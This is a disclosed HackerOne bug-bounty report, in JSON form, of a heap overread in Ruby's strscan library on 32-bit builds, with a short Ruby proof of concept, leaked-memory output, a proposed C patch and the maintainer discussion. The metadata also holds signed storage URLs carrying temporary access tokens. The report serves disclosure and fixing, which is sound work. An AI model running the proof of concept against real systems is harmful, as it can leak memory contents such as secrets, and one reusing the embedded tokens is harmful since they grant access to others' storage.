{"id":166661,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjY2NjE=","url":"https://hackerone.com/reports/166661","title":"Arbitrary heap overread in strscan on 32 bit Ruby, patch included","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-09-07T20:12:07.163Z","submitted_at":"2016-09-07T20:12:07.163Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"guido","url":"/guido","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-11-17T00:30:21.494Z","bug_reporter_agreed_on_going_public_at":"2016-11-16T10:08:50.689Z","team_member_agreed_on_going_public_at":"2016-11-17T00:30:21.452Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"```ruby\nrequire 'strscan'\nx = 'x' * 0x7FFFFFFE\ns = StringScanner.new(x)\ns.pos = 0x7FFFFFFD\nt = s.peek(40000)\nt.each_byte do |i|\n\tif i != 0\n\t\tprint i.chr\n\tend\nend\n```\n\nRun:\n\n```sh\n./ruby r.rb | strings\n```\n\nMy output:\n\n```\n@\t;\u003e@V`TdBE\n__gmon_start___fini_ITM_deregisterTMCloneTable_ITM_registerTMCloneTable__cxa_finalize_Jv_RegisterClassesonig_region_memsizeonig_region_freeruby_xfreerb_gc_markrb_check_typeddatarb_num2longrb_eRangeErrorrb_raiserb_int2bigrb_eArgErrorrb_string_valuerb_reg_region_copyrb_memerrorrb_scan_argsrb_data_typed_object_zalloconig_region_initrb_str_newrb_str_dumprb_str_new_staticrb_str_catrb_funcallrb_str_lengthrb_str_appendrb_warningrb_enc_copyrb_sym2strrb_enc_getonig_name_to_backref_numberrb_eIndexErrorrb_enc_raiseonig_region_clearonig_region_setrb_enc_mbclenrb_check_typerb_reg_prepare_reonig_matchonig_freeonig_searchrb_obj_classrb_sprintfInit_strscanrb_cObjectrb_define_classrb_eStandardErrorrb_define_class_underrb_const_definedrb_obj_freezerb_const_setrb_define_alloc_funcrb_define_private_methodrb_define_singleton_methodrb_define_methodrb_intern2rb_aliaslibpthread.so.0libdl.so.2libcrypt.so.1libm.so.6libc.so.6_edata__bss_start_endGLIBC_2.1.3\n@xh[\nD$ P\nUWVS\n[^_]\n\u0026UWVS\n[^_]\nt\u0026WVS\nt\u0026VS\n'WVS\nD$ P\nt\u0026UWVS\n[^_]\n;|$0|\nL$0)\n;|$0|\nL$0)\n'UWVS\nl$\u003cP\n[^_]\n~`9G\n[^_]\nPjjW\nvWVS\nPjjW\nt\u0026WVS\nPjjW\nvUWVS\n[^_]\nvUWVS\n|$@P\n[^_]\n'UWVS\n|$\u003cj\n[^_]\n~$RW\nQRQU\n\u0026UWVS\n|$\u003cj\n[^_]\n~$RW\nRPRPU\nUWVS\n|$\u003cj\n[^_]\n~$RW\nQRQU\n[^_]\nUWVS\n|$\u003cj\n[^_]\n~$RW\nRPRPU\n\u0026UWVS\n|$\u003cj\n[^_]\n~$RW\nRPRPU\n[^_]\n\u0026UWVS\n|$\u003cj\n[^_]\n~$RW\nQRQU\n'UWVS\n|$\u003cj\n[^_]\n~$RW\nQRQU\nUWVS\n|$\u003cj\n[^_]\n~$RW\nRPRPU\nUWVS\n|$\u003cj\n[^_]\n~$RW\nRPRPU\nUWVS\n|$\u003cj\n[^_]\n~$RW\nQRQU\nt\u0026UWVS\n|$\u003cP\n[^_]\n'UWVS\n[^_]\n\u0026UWVS\n[^_]\nvWVS\n^j/P\n jPW\n [^_\nuninitialized StringScanner objectunscan failed: previous match record not existStringScanner#clear is obsolete; use #terminate insteadStringScanner#restsize is obsolete; use #rest_size insteadundefined group name reference: %.*sStringScanner#getbyte is obsolete; use #get_byte insteadStringScanner#peep is obsolete; use #peek insteadStringScanner#empty? is obsolete; use #eos? instead$Id: strscan.c 52988 2015-12-09 01:01:17Z ko1 $index out of range11...regexp buffer overflow#\u003c%li\n (uninitialized)\u003e#\u003c%li\n fin\u003e#\u003c%li\n %ld/%ld @ %li\n\u003e#\u003c%li\n %ld/%ld %li\n @ %li\n\u003eScanErrorbytesliceStringScanner0.7.0VersionIdinitializeinitialize_copymust_C_versionresetterminateclearstringstring=concat\u003c\u003cpos=charpospointerpointer=skipmatch?checkscan_fullscan_untilskip_untilexist?check_untilsearch_fullgetchget_bytegetbytepeekpeepunscanbeginning_of_line?bol?eos?empty?rest?matched?matchedmatched_size[]pre_matchpost_matchrestrest_sizerestsizeinspect\n;*2$\"\n pH\tp\nvGCC: (Debian 4.9.2-10) 4.9.2\n^\u003c\t M\nPF\tY\nH\t$M\n)d\tnW\n4,\t'b\n@\t;y\n^P\t(\n^T\t`\n^X\t]\n\\\tg2\n\t\t6%\n^\u003c\t M\nPF\tY\nH\t$M\n)d\tnW\n4,\t'b\n@\t;y\n^P\t(\n^T\t`\n^X\t]\n\\\tg2\n\t\t6%\n```\n\nProposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.\n```c\nbeg_i + len \u003c beg_i\n```\n\nsince that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.\n\n```diff\ndiff --git a/ext/strscan/strscan.c b/ext/strscan/strscan.c\nindex 9b52fea..7dfe17a 100644\n--- a/ext/strscan/strscan.c\n+++ b/ext/strscan/strscan.c\n@@ -153,7 +153,7 @@ static VALUE\n extract_beg_len(struct strscanner *p, long beg_i, long len)\n {\n     if (beg_i \u003e S_LEN(p)) return Qnil;\n-    if (beg_i + len \u003e S_LEN(p))\n+    if (len \u003c 0 || beg_i \u003e (LONG_MAX - len) || beg_i + len \u003e S_LEN(p))\n         len = S_LEN(p) - beg_i;\n     return infect(str_new(p, S_PBEG(p) + beg_i, len), p);\n }\n```\n\nNote that malice isn't necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).\n\nThe vulnerability is not expected to work on 64 bit systems because of the much larger limits of the ```long``` type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.\n\nTested on ruby-2.3.1 ","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-12-16T10:08:50.718Z","allow_singular_disclosure_after":-152077248.95056975,"singular_disclosure_allowed":true,"vote_count":17,"voters":["dirk","michiel","cuso4","mpz","madrobot","supernatural","eveeez","guido","ajdumanhug","spetr0x","and 7 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1181700,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Confirmed.\nI think the condition can be:\n\n~~~C\n    if (len \u003e S_LEN(p) - beg_i)\n        len = S_LEN(p) - beg_i;\n~~~","automated_response":false,"created_at":"2016-09-08T06:18:15.223Z","updated_at":"2016-09-08T06:18:15.223Z","actor":{"username":"nobu","cleared":false,"url":"/nobu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1182202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"str_new0 will catch negative values so you are right.\n\nThis might also be vulnerable:\n```\n 719 static VALUE\n 720 strscan_getch(VALUE self)\n 721 {\n 722     struct strscanner *p;\n 723     long len;\n 724 \n 725     GET_SCANNER(self, p);\n 726     CLEAR_MATCH_STATUS(p);\n 727     if (EOS_P(p))\n 728         return Qnil;\n 729 \n 730     len = rb_enc_mbclen(CURPTR(p), S_PEND(p), rb_enc_get(p-\u003estr));\n 731     if (p-\u003ecurr + len \u003e S_LEN(p)) {                                                                                                                      \n 732         len = S_LEN(p) - p-\u003ecurr; \n 733     }\n 734     p-\u003eprev = p-\u003ecurr;\n 735     p-\u003ecurr += len;\n 736     MATCHED(p);\n 737     adjust_registers_to_matched(p);\n 738     return extract_range(p, p-\u003eprev + p-\u003eregs.beg[0],\n 739                             p-\u003eprev + p-\u003eregs.end[0]);\n 740 }\n```\n\nI cannot verify it at this very moment. But if it is vulnerable, the bug in this in function has the additional consequence that it will set ```p-\u003ecurr``` to an OOB position, which may have further ramifications via functions that rely on a correct ```curr`` value.\n\nWill report back on this later.","automated_response":false,"created_at":"2016-09-08T12:48:13.136Z","updated_at":"2016-09-08T12:48:13.136Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1190450,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe ```getch``` isn't vulnerable since the underlying ```rb_enc_mbclen``` automatically caps the length that it returns to ```end - start```, so even multi-byte encodings like UTF32 won't cause an overflow.\n\nCan you give an estimated time/date of bug resolution and disclosure?\n\nThanks.","automated_response":false,"created_at":"2016-09-13T08:49:41.379Z","updated_at":"2016-09-13T08:49:41.379Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1201689,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).\n\nIt's doubtful.\nUsing `strscan` with a half of whole memory space is unusual.","automated_response":false,"created_at":"2016-09-17T03:00:46.417Z","updated_at":"2016-09-17T03:00:46.417Z","actor":{"username":"nobu","cleared":false,"url":"/nobu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1201869,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Alright.\n\nWhen will this be fixed and closed?","automated_response":false,"created_at":"2016-09-17T09:11:14.240Z","updated_at":"2016-09-17T09:11:14.240Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1215154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The lack of communication here is disappointing.","automated_response":false,"created_at":"2016-09-25T20:00:21.500Z","updated_at":"2016-09-25T20:00:21.500Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1245708,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"Vulnerability was acknowledged and fixed in upstream. Team is completely unresponsive now. All that they need to do is close the bug, so that the IBB can deliberate on a reward.","automated_response":false,"created_at":"2016-10-13T12:06:22.607Z","updated_at":"2016-10-13T12:06:22.607Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301884,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-11-16T07:32:54.624Z","updated_at":"2016-11-16T07:32:54.624Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":7795},"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134939Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c932b189aa2f60f100c9b8952e67164e84a927da41330a18ae40cffe061a2975"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1301885,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-11-16T07:33:15.745Z","updated_at":"2016-11-16T07:33:15.745Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134939Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c932b189aa2f60f100c9b8952e67164e84a927da41330a18ae40cffe061a2975"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"guido","url":"/guido"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1302066,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-11-16T10:08:50.703Z","updated_at":"2016-11-16T10:08:50.703Z","first_to_agree":true,"actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1302350,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-11-16T12:45:44.097Z","updated_at":"2016-11-16T12:45:44.097Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby"}},"bounty_amount":"200.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"guido","url":"/guido"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1302950,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks IBB.","automated_response":false,"created_at":"2016-11-16T19:22:08.977Z","updated_at":"2016-11-16T19:22:08.977Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1303418,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-11-17T00:30:21.470Z","updated_at":"2016-11-17T00:30:21.470Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134939Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c932b189aa2f60f100c9b8952e67164e84a927da41330a18ae40cffe061a2975"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1303419,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-11-17T00:30:21.509Z","updated_at":"2016-11-17T00:30:21.509Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134939Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c932b189aa2f60f100c9b8952e67164e84a927da41330a18ae40cffe061a2975"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}